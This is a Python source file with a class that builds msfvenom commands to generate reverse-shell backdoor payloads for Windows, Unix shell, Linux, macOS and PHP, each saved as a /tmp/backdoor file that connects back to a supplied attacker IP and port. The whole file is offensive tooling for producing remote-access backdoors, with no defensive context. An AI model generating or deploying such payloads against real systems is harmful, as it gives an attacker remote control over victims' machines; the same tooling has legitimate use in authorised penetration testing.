class msfCrafting(object):
    """docstring for msfCrafting."""
    def __init__(self, platform, ipaddrs, remoteport):
        self.venomcmd = ""
        self.plat = platform
        self.ip = ipaddrs
        self.port = remoteport
        self.file = ""

    def createWindowsPayload(self):
        self.venomcmd="msfvenom -p windows/meterpreter/reverse_tcp LHOST="+self.ip+" LPORT="+self.port+" -f exe -o /tmp/backdoor.exe"
        self.file = "/tmp/backdoor.exe"

    def createShPayload(self):
        self.venomcmd="msfvenom -p cmd/unix/reverse_bash LHOST="+self.ip+" LPORT="+self.port+" -f raw -o /tmp/backdoor.sh"
        self.file = "/tmp/backdoor.sh"

    def createLinuxPayload(self):
        self.venomcmd="msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="+self.ip+" LPORT="+self.port+" -f elf -o /tmp/backdoor.elf"
        self.file = "/tmp/backdoor.elf"

    def createOsxPayload(self):
        self.venomcmd="msfvenom -p osx/x86/shell_reverse_tcp LHOST="+self.ip+" LPORT="+self.port+" -f macho -o /tmp/backdoor.macho"
        self.file = "/tmp/backdoor.macho"

    def createPhpPayload(self):
        self.venomcmd="msfvenom -p php/reverse_php LHOST="+self.ip+" LPORT="+self.port+" -f raw -o /tmp/backdoor.php"
        self.file = "/tmp/backdoor.php"

    def run(self):
        if self.plat == "windows":
            self.createWindowsPayload()
            pass
        if self.plat == "sh":
            self.createShPayload()
            pass
        if self.plat == "linux":
            self.createLinuxPayload()
            pass
        if self.plat == "macox":
            self.createOsxPayload()
            pass
        if self.plat == "web":
            self.createPhpPayload()
            pass

    def getPayloadFile(self):
        return self.file

    def getPayloadCmd(self):
        return self.venomcmd
